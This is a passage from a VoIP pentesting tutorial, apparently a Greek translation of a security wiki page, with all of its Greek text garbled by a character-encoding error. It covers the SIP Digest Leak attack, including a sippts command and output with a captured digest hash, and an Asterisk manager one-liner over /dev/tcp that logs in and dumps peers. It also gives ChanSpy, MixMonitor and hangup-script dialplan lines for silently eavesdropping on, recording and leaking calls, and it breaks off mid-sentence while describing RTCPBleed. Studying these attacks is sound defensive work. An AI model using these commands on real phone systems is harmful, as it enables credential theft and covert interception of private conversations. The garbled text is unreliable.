Î— ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± SIP Digest Leak ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€Î¿Ï… ÎµÏ€Î·ÏÎµÎ¬Î¶ÎµÎ¹ Î­Î½Î±Î½ Î¼ÎµÎ³Î¬Î»Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ SIP Phones, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„ÏŒÏƒÎ¿ Ï…Î»Î¹ÎºÏÎ½ ÏŒÏƒÎ¿ ÎºÎ±Î¹ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÏÎ½ IP Phones ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿Î³Î­Ï‰Î½ Ï„Î·Î»ÎµÏ†ÏÎ½Î¿Ï… (VoIP ÏƒÎµ Î±Î½Î±Î»Î¿Î³Î¹ÎºÏŒ). Î— ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ **Î´Î¹Î±ÏÏÎ¿Î® Ï„Î·Ï‚ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Digest**, Î· Î¿Ï€Î¿Î¯Î± Ï…Ï€Î¿Î»Î¿Î³Î¯Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚. ÎœÎ¹Î± **ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎµÎºÏ„ÏŒÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î´Ï…Î½Î±Ï„Î®** ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·Ï‚.

**[Î£ÎµÎ½Î¬ÏÎ¹Î¿ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î±Ï€ÏŒ ÎµÎ´Ï**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. ÎˆÎ½Î± IP Phone (Î¸ÏÎ¼Î±) Î±ÎºÎ¿ÏÎµÎ¹ ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¸ÏÏÎ± (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: 5060), Î±Ï€Î¿Î´ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÎ­Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚
2. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î¼Î¹Î± INVITE ÏƒÏ„Î¿ IP Phone
3. Î¤Î¿ Ï„Î·Î»Î­Ï†Ï‰Î½Î¿ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡Î¯Î¶ÎµÎ¹ Î½Î± Ï‡Ï„Ï…Ï€Î¬ ÎºÎ±Î¹ ÎºÎ¬Ï€Î¿Î¹Î¿Ï‚ Ï„Î¿ ÏƒÎ·ÎºÏÎ½ÎµÎ¹ ÎºÎ±Î¹ Ï„Î¿ ÎºÎ»ÎµÎ¯Î½ÎµÎ¹ (ÎµÏ€ÎµÎ¹Î´Î® ÎºÎ±Î½ÎµÎ¯Ï‚ Î´ÎµÎ½ Î±Ï€Î±Î½Ï„Î¬ ÏƒÏ„Î¿ Ï„Î·Î»Î­Ï†Ï‰Î½Î¿ ÏƒÏ„Î·Î½ Î¬Î»Î»Î· Î¬ÎºÏÎ·)
4. ÎŒÏ„Î±Î½ Ï„Î¿ Ï„Î·Î»Î­Ï†Ï‰Î½Î¿ ÎºÎ»ÎµÎ¯Î½ÎµÎ¹, Ï„Î¿ **Ï„Î·Î»Î­Ï†Ï‰Î½Î¿ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î­Î½Î± BYE ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿**
5. ÎŸ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎºÎ´Î¯Î´ÎµÎ¹ Î¼Î¹Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· 407** Ï€Î¿Ï… **Î¶Î·Ï„Î¬ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·** ÎºÎ±Î¹ ÎµÎºÎ´Î¯Î´ÎµÎ¹ Î¼Î¹Î± Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚
6. Î¤Î¿ **Ï„Î·Î»Î­Ï†Ï‰Î½Î¿ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¼Î¹Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÏƒÏ„Î·Î½ Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚** ÏƒÎµ Î­Î½Î± Î´ÎµÏÏ„ÎµÏÎ¿ BYE
7. ÎŸ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÎºÎ´ÏÏƒÎµÎ¹ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· brute-force** ÏƒÏ„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î½ Ï„Î¿Ï€Î¹ÎºÏŒ Ï„Î¿Ï… Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® (Î® ÏƒÎµ ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½Î¿ Î´Î¯ÎºÏ„Ï…Î¿ Îº.Î»Ï€.) ÎºÎ±Î¹ Î½Î± Î¼Î±Î½Ï„Î­ÏˆÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚

* **SIPPTS leak** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î— Î´Î¹Î±ÏÏÎ¿Î® SIPPTS ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± SIP Digest Leak Ï€Î¿Ï… ÎµÏ€Î·ÏÎµÎ¬Î¶ÎµÎ¹ Î­Î½Î±Î½ Î¼ÎµÎ³Î¬Î»Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ SIP Phones. Î— Î­Î¾Î¿Î´Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ ÏƒÎµ Î¼Î¿ÏÏ†Î® SipCrack Î³Î¹Î± Î½Î± Î³Î¯Î½ÎµÎ¹ brute force Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ SIPPTS dcrack Î® Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Î¤Î¿ Click2Call ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ **Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î¿Ï… Î´Î¹Î±Î´Î¹ÎºÏ„ÏÎ¿Ï…** (Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎµÏ„Î±Î¹ Î³Î¹Î± Î­Î½Î± Ï€ÏÎ¿ÏŠÏŒÎ½) Î½Î± **ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹** Ï„Î¿Î½ **Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Î·Î»ÎµÏ†ÏÎ½Î¿Ï…** Ï„Î¿Ï… Î³Î¹Î± Î½Î± Î»Î¬Î²ÎµÎ¹ ÎºÎ»Î®ÏƒÎ·. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¸Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÎ¼Ï€Î¿ÏÎ¹ÎºÎ® ÎºÎ»Î®ÏƒÎ·, ÎºÎ±Î¹ ÏŒÏ„Î±Î½ **ÏƒÎ·ÎºÏÏƒÎµÎ¹ Ï„Î¿ Ï„Î·Î»Î­Ï†Ï‰Î½Î¿** Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¸Î± **ÎºÎ±Î»ÎµÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î¸Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î¼Îµ Ï„Î¿Î½ Ï€ÏÎ¬ÎºÏ„Î¿ÏÎ±**.

ÎˆÎ½Î± ÎºÎ¿Î¹Î½ÏŒ Ï€ÏÎ¿Ï†Î¯Î» Asterisk Î³Î¹Î± Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Î¤Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€ÏÎ¿Ï†Î¯Î» ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ **ÎŸÎ ÎŸÎ™ÎŸÎ”Î—Î ÎŸÎ¤Î• IP Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯** (Î±Î½ ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒÏ‚ Î¿ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚).
* Î“Î¹Î± Î½Î± **Î´Î¹Î¿ÏÎ³Î±Î½Ï‰Î¸ÎµÎ¯ Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ·**, ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚, **Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚** ÎºÎ±Î¹ **Î¼ÏŒÎ½Î¿** **originate** ÏƒÎµ **write** ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î±.

ÎœÎµ Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±, Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ IP Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÎºÎ±Î¹ Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Ï€Î¬ÏÎ± Ï€Î¿Î»Î»Î­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, ÏŒÏ€Ï‰Ï‚:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î® ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± Î¶Î·Ï„Î·Î¸Î¿ÏÎ½.**

### **Î Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ·**

Î£Ï„Î¿ Asterisk ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· ÎµÎ½Ï„Î¿Î»Î® **`ChanSpy`** Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ Ï„Î·Î½ **ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î³ÏÎ±Î¼Î¼Î®(ÎµÏ‚) Ï€ÏÎ¿Ï‚ Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ·** (Î® ÏŒÎ»ÎµÏ‚ Î±Ï…Ï„Î­Ï‚) Î³Î¹Î± Î½Î± Î±ÎºÎ¿ÏÏƒÎµÏ„Îµ Ï„Î¹Ï‚ ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯ÎµÏ‚ Ï€Î¿Ï… ÏƒÏ…Î¼Î²Î±Î¯Î½Î¿Ï…Î½. Î‘Ï…Ï„Î® Î· ÎµÎ½Ï„Î¿Î»Î® Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯ ÏƒÎµ Î¼Î¹Î± ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î³ÏÎ±Î¼Î¼Î®.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, **`exten => 333,1,ChanSpy('all',qb)`** Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î±Î½ **ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ** Ï„Î·Î½ **ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î³ÏÎ±Î¼Î¼Î® 333**, Î¸Î± **Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯** **`ÏŒÎ»ÎµÏ‚`** Ï„Î¹Ï‚ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Î³ÏÎ±Î¼Î¼Î­Ï‚, **Î¾ÎµÎºÎ¹Î½ÏÎ½Ï„Î±Ï‚ Î½Î± Î±ÎºÎ¿ÏÎµÎ¹** ÏŒÏ€Î¿Ï„Îµ Î¾ÎµÎºÎ¹Î½Î¬ Î¼Î¹Î± Î½Î­Î± ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯Î± (**`b`**) ÏƒÎµ Î®ÏƒÏ…Ï‡Î¿ Ï„ÏÏŒÏ€Î¿ (**`q`**) ÎºÎ±Î¸ÏÏ‚ Î´ÎµÎ½ Î¸Î­Î»Î¿Ï…Î¼Îµ Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎ¿Ï…Î¼Îµ ÏƒÎµ Î±Ï…Ï„Î®Î½. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ Î±Ï€ÏŒ Î¼Î¹Î± ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯Î± ÏƒÎµ Î¬Î»Î»Î· Ï€Î±Ï„ÏÎ½Ï„Î±Ï‚ **`*`**, Î® ÏƒÎ·Î¼ÎµÎ¹ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Î·Ï‚ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ®Ï‚ Î³ÏÎ±Î¼Î¼Î®Ï‚.

Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **`ExtenSpy`** Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÎµÏ„Îµ Î¼ÏŒÎ½Î¿ Î¼Î¯Î± ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î³ÏÎ±Î¼Î¼Î®.

Î‘Î½Ï„Î¯ Î½Î± Î±ÎºÎ¿ÏÏ„Îµ Ï„Î¹Ï‚ ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯ÎµÏ‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Ï„Î¹Ï‚ ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î±** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î³ÏÎ±Î¼Î¼Î® ÏŒÏ€Ï‰Ï‚: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

ÎŸÎ¹ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ **`/tmp`**.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ Asterisk **Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… Î¸Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ·** ÏŒÏ„Î±Î½ ÎºÎ»ÎµÎ¯ÏƒÎµÎ¹.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±

**RTCPBleed** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Ï€ÏÏŒÎ²Î»Î·Î¼Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… ÎµÏ€Î·ÏÎµÎ¬Î¶ÎµÎ¹ Ï„Î¿Ï…Ï‚ VoIP Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ ÏƒÎµ Asterisk (Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÎ¸Î·ÎºÎµ Ï„Î¿ 2017). Î— ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿ **RTP (Î ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Î ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¿Ï Î§ÏÏŒÎ½Î¿Ï…) traffic**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¼ÎµÏ„Î±Ï†Î­ÏÎµÎ¹ Ï„Î¹Ï‚ ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯ÎµÏ‚ VoIP, Î½Î± **Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ Î½Î± Î±Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ ÏƒÏ„Î¿ Î”Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿**. Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ RTP traffic Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÏŒÏ„Î±Î½ Ï€ÎµÏÎ¹Î·Î³ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ NAT (ÎœÎµÏ„Î¬Ï†ÏÎ±ÏƒÎ· Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ Î”Î¹ÎºÏ„ÏÎ¿Ï…) firewalls.

ÎŸÎ¹ RTP proxies Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î¿ÏÎ½ Î½Î± Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯ÏƒÎ¿Ï…Î½ Ï„Î¿Ï…Ï‚ **Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚ NAT** Ï€Î¿Ï… ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Ï…Î½ Ï„Î± RTC ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Ï€ÏÎ¿Î¾ÎµÎ½ÏÎ½Ï„Î±Ï‚ ÏÎ¿Î­Ï‚ RTP Î¼ÎµÏ„Î±Î¾Ï Î´ÏÎ¿ Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÏ‰Î½ Î¼ÎµÏÏÎ½. ÎŒÏ„Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ NAT, Ï„Î¿ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÏŒ RTP proxy ÏƒÏ…Ï‡Î½Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²Î±ÏƒÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ IP ÎºÎ±Î¹ port RTP Ï€Î¿Ï… Î±Î½Î±ÎºÏ„ÏÎ½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ ÏƒÎ®Î¼Î±Î½ÏƒÎ·Ï‚ (Ï€.Ï‡. SIP). Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±ÏÎºÎµÏ„Î¿Î¯ RTP proxies Î­Ï‡Î¿Ï…Î½ ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎµÎ¹ Î­Î½Î±Î½ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ ÏŒÏ€Î¿Ï… Ï„Î­Ï„Î¿Î¹Î¿ **IP ÎºÎ±Î¹ port tuplet Î¼Î±Î¸Î±Î¯Î½ÎµÏ„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î±**. Î‘Ï…Ï„ÏŒ Î³Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ…Ï‡Î½Î¬ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¹Î¸ÎµÏÏÎ·ÏƒÎ· Ï„Î·Ï‚ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î·Ï‚ RTP traffic ÎºÎ±Î¹ Ï„Î·Î½ ÎµÏ€Î¹ÏƒÎ®Î¼Î±Î½ÏƒÎ· Ï„Î·Ï‚ Ï€Î·Î³Î®Ï‚ IP ÎºÎ±Î¹ port Î³Î¹Î± Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î· RTP traffic Ï‰Ï‚ Î±Ï…Ï„Î® Ï€Î¿Ï… Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î±Î½Ï„Î·Î¸ÎµÎ¯. Î‘Ï…Ï„ÏŒÏ‚ Î¿ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ "Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÎºÎ¼Î¬Î¸Î·ÏƒÎ·Ï‚", **Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ±Î½ÎµÎ½ÏŒÏ‚ ÎµÎ¯Î´Î¿Ï…Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î½ RTP traffic ÏƒÏ„Î¿Î½ RTP proxy** ÎºÎ±Î¹ Î½Î± Î»Î¬Î²Î¿Ï…Î½ Ï„Î·Î½ Ï€ÏÎ¿Î¾ÎµÎ½Î·Î¼Î­Î½Î· RTP traffic Ï€Î¿Ï… Ï€ÏÎ¿Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Ï„Î¿Î½ ÎºÎ±Î»Î¿ÏÎ½Ï„Î± Î® Ï„Î¿Î½ ÎºÎ±Î»Î¿ÏÎ¼ÎµÎ½Î¿ Î¼Î¹Î±Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ±Ï‚ ÏÎ¿Î®Ï‚ RTP. Î‘Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï„Î·Î½ Î¿Î½Î¿Î¼Î¬Î¶Î¿Ï…Î¼Îµ RTP Bleed ÎµÏ€ÎµÎ¹Î´Î® 